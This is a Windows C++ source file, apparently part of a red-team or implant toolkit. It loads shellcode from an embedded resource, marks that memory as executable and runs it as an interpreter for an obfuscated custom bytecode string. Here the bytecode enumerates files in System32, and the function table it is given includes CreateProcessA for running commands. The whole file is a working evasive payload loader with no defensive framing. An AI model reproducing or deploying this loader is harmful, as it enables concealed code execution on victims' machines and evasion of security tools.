#include <iostream>
#include <windows.h>
#include "resource.h"

using namespace std;

// Release

int main() {
    // 从资源获取 ShellCode
    HRSRC res = FindResource(NULL, MAKEINTRESOURCE(IDR_BIN1), L"BIN");
    DWORD size = SizeofResource(NULL, res);
    HGLOBAL load = LoadResource(NULL, res);

    PVOID shellcode = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_READWRITE);
    memcpy(shellcode, load, size);
    DWORD oldProtect;
    VirtualProtect(shellcode, size, PAGE_EXECUTE_READ, &oldProtect);

    // 自定义汇编 (获取文件信息列表)
    char selfAsm[] = "0_4_q_pq70+i20_q_q38_5_4_q_pq70+i18_q_q30_a_4_d_pq70+i10_d_d18_e_4_q_pq70+i8_q_q10_13_0_q_q8_q__14_0_q_q28_q__15_11_q_q70_q_i228_1c_4_d_d0_d_i8_21_13_q_q0_q_i0_25_4_d_d10_d_i2bc_2a_4_q_q18_q_pq70+i260_32_2_q_pq18+q0_q__35_4_q_q10_q_pq70+i250_3d_4_q_pq10_q_q0_40_4_q_q0_q_pq70+i250_48_4_q_q0_q_pq0_4b_4_b_pq0_b_i30_4e_4_q_q0_q_pq70+i250_56_4_q_q0_q_pq0_59_4_b_pq0+i1_b_i0_5d_4_q_q0_q_pq70+i258_65_4_d_pq0_d_i1_6b_4_d_d0_d_i8_70_13_q_q0_q_ib_74_8_q_q18_q_lq70+ie0_7c_4_q_q10_q_pq70+i240_84_4_q_q30_q_pq70+i260_8c_2_q_pq30+q0_q__90_4_q_pq70+i98_q_q0_98_12_q_pq70+i98_q_i-1_a1_22_q_i45e_q__a7_4_d_d0_d_i8_ac_13_q_q0_q_ie_b0_16_d_d38_d_d38_b3_4_q_q10_q_pq70+i250_bb_4_q_q30_q_pq10_be_4_d_d18_d_i104_c3_4_q_q10_q_pq70+i240_cb_4_q_q40_q_pq70+i260_d3_2_q_pq40+q0_q__d7_17_d_d0_d_d0_d9_23_q_ifc_q__db_4_d_d0_d_i8_e0_13_q_q0_q_id_e4_4_q_q10_q_pq70+i98_ec_4_q_q18_q_pq70+i260_f4_2_q_pq18+q0_q__f7_21_q_i487_q__fc_4_d_d0_d_i1_101_13_q_q0_q_i0_105_5_d_d0_b_pq70+q0+i10c_10d_12_d_d0_d_i2e_110_22_q_i432_q__116_4_d_d0_d_i8_11b_13_q_q0_q_i3_11f_4_q_q10_q_pq70+i250_127_4_q_q10_q_pq10_12a_4_q_q18_q_pq70+i260_132_2_q_pq18+q0_q__135_12_q_q0_q_i14a_13b_24_q_i1a0_q__13d_4_d_d0_d_i8_142_13_q_q0_q_i3_146_4_q_q10_q_pq70+i250_14e_4_q_q10_q_pq10_151_4_q_q18_q_pq70+i260_159_2_q_pq18+q0_q__15c_9_q_q0_q_i14a_162_4_d_d10_d_i8_167_13_q_q10_q_i1_16b_4_q_pq70+ic8_q_q10_173_4_q_q18_q_q0_176_4_q_q0_q_pq70+i250_17e_4_q_q10_q_pq0_181_4_q_q0_q_pq70+i260_189_4_q_q30_q_pq70+ic8_191_2_q_pq0+q30_q__195_4_q_q10_q_pq70+i250_19d_4_q_pq10_q_q0_1a0_4_d_d0_d_i8_1a5_13_q_q0_q_if_1a9_8_q_q18_q_lq70+ib8_1b1_8_q_q10_q_lq70+if4_1b9_4_q_q30_q_pq70+i260_1c1_2_q_pq30+q0_q__1c5_17_d_d0_d_d0_1c7_23_q_i1ea_q__1c9_4_d_d0_d_i8_1ce_13_q_q0_q_id_1d2_4_q_q10_q_pq70+i98_1da_4_q_q18_q_pq70+i260_1e2_2_q_pq18+q0_q__1e5_21_q_i45e_q__1ea_4_b_pq70+i60_b_ia_1ef_4_b_pq70+i61_b_i25_1f4_4_b_pq70+i62_b_i64_1f9_4_b_pq70+i63_b_i2c_1fe_4_b_pq70+i64_b_i25_203_4_b_pq70+i65_b_i73_208_4_b_pq70+i66_b_i2c_20d_4_b_pq70+i67_b_i25_212_4_b_pq70+i68_b_i6c_217_4_b_pq70+i69_b_i6c_21c_4_b_pq70+i6a_b_i75_221_4_b_pq70+i6b_b_i2c_226_4_b_pq70+i6c_b_i25_22b_4_b_pq70+i6d_b_i30_230_4_b_pq70+i6e_b_i34_235_4_b_pq70+i6f_b_i64_23a_4_b_pq70+i70_b_i2e_23f_4_b_pq70+i71_b_i25_244_4_b_pq70+i72_b_i30_249_4_b_pq70+i73_b_i32_24e_4_b_pq70+i74_b_i64_253_4_b_pq70+i75_b_i2e_258_4_b_pq70+i76_b_i25_25d_4_b_pq70+i77_b_i30_262_4_b_pq70+i78_b_i32_267_4_b_pq70+i79_b_i64_26c_4_b_pq70+i7a_b_i20_271_4_b_pq70+i7b_b_i25_276_4_b_pq70+i7c_b_i30_27b_4_b_pq70+i7d_b_i32_280_4_b_pq70+i7e_b_i64_285_4_b_pq70+i7f_b_i3a_28a_4_b_pq70+i80_b_i25_292_4_b_pq70+i81_b_i30_29a_4_b_pq70+i82_b_i32_2a2_4_b_pq70+i83_b_i64_2aa_4_b_pq70+i84_b_i3a_2b2_4_b_pq70+i85_b_i25_2ba_4_b_pq70+i86_b_i30_2c2_4_b_pq70+i87_b_i32_2ca_4_b_pq70+i88_b_i64_2d2_4_b_pq70+i89_b_i0_2da_4_d_d0_d_pq70+ie0_2e1_14_d_d0_d_i10_2e4_17_d_d0_d_d0_2e6_22_q_i2f5_q__2e8_4_d_pq70+i90_d_i1_2f3_21_q_i300_q__2f5_4_d_pq70+i90_d_i0_300_6_d_d0_w_pq70+ic4_308_4_d_pq70+ia0_d_d0_30f_6_d_d10_w_pq70+ic2_317_4_d_pq70+ia4_d_d10_31e_6_d_d18_w_pq70+ic0_326_4_d_pq70+ia8_d_d18_32d_6_d_d30_w_pq70+ibe_336_4_d_pq70+iac_d_d30_33e_6_d_d38_w_pq70+iba_347_4_d_pq70+ib0_d_d38_34f_6_d_d40_w_pq70+ib8_358_4_d_pq70+ib4_d_d40_360_4_d_d48_d_pq70+ifc_368_18_q_q48_q_i20_36c_4_d_d8_d_pq70+i100_373_15_q_q48_q_q8_376_4_q_q8_q_q48_379_4_d_d48_d_i8_37f_13_q_q48_q_i3_383_4_q_q28_q_pq70+i250_38b_4_q_q10_q_pq28_38e_4_q_q28_q_pq70+i260_396_2_q_pq28+q48_q__39a_4_q_q10_q_pq70+i250_3a2_9_q_q0_q_pq10_3a5_4_d_d10_d_i8_3aa_13_q_q10_q_i6_3ae_4_q_pq70+id0_q_q10_3b6_4_d_d18_d_pq70+ia0_3bd_4_d_pq70+i58_d_d18_3c1_4_d_d18_d_pq70+ia4_3c8_4_d_pq70+i50_d_d18_3cc_4_d_d18_d_pq70+ia8_3d3_4_d_pq70+i48_d_d18_3d7_4_d_d18_d_pq70+iac_3de_4_d_pq70+i40_d_d18_3e2_4_d_d18_d_pq70+ib0_3e9_4_d_pq70+i38_d_d18_3ed_4_d_d18_d_pq70+ib4_3f4_4_d_pq70+i30_d_d18_3f8_4_q_pq70+i28_q_q8_3fd_8_q_q18_q_lq70+i10c_405_4_q_pq70+i20_q_q18_40a_4_d_d38_d_pq70+i90_412_8_q_q30_q_lq70+i60_417_4_d_d18_d_i14a_41c_4_q_q10_q_q0_41f_4_q_q0_q_pq70+i260_427_4_q_q8_q_pq70+id0_42f_2_q_pq0+q8_q__432_4_d_d0_d_i8_437_13_q_q0_q_ic_43b_8_q_q18_q_lq70+ie0_443_4_q_q10_q_pq70+i98_44b_4_q_q8_q_pq70+i260_453_2_q_pq8+q0_q__456_17_d_d0_d_d0_458_23_q_ifc_q__45e_4_d_d0_d_i8_463_13_q_q0_q_i3_467_4_q_q10_q_pq70+i250_46f_4_q_q10_q_pq10_472_4_q_q18_q_pq70+i260_47a_2_q_pq18+q0_q__47d_4_q_q10_q_pq70+i258_485_4_d_pq10_d_d0_487_9_q_q70_q_i228_48e_1_q_q28_q__48f_1_q_q8_q__490_3_q__q__!";

    // ShellCode 参数 (获取文件信息列表)
    char commandPara[] = "C:\\Windows\\System32\\*";
    int commandParaLength = strlen(commandPara) + 1;
    char* outputData;
    int outputDataLength;
    PVOID funcAddr[] = { malloc, realloc, free, strlen, strtol, ((errno_t(*)(char*, rsize_t, const char*))strcpy_s), ((int(*)(char*, size_t, const char*, ...))sprintf_s), CloseHandle, CreateProcessA, CreatePipe, ReadFile, FindFirstFileA, FindNextFileA, FindClose, GetFullPathNameA, FileTimeToSystemTime };

    // 调用解释器
    ((void(*)(...))shellcode)(selfAsm, commandPara, commandParaLength, &outputData, &outputDataLength, funcAddr);

    // ShellCode 输出
    *(outputData + outputDataLength) = '\0';
    cout << outputData;
}
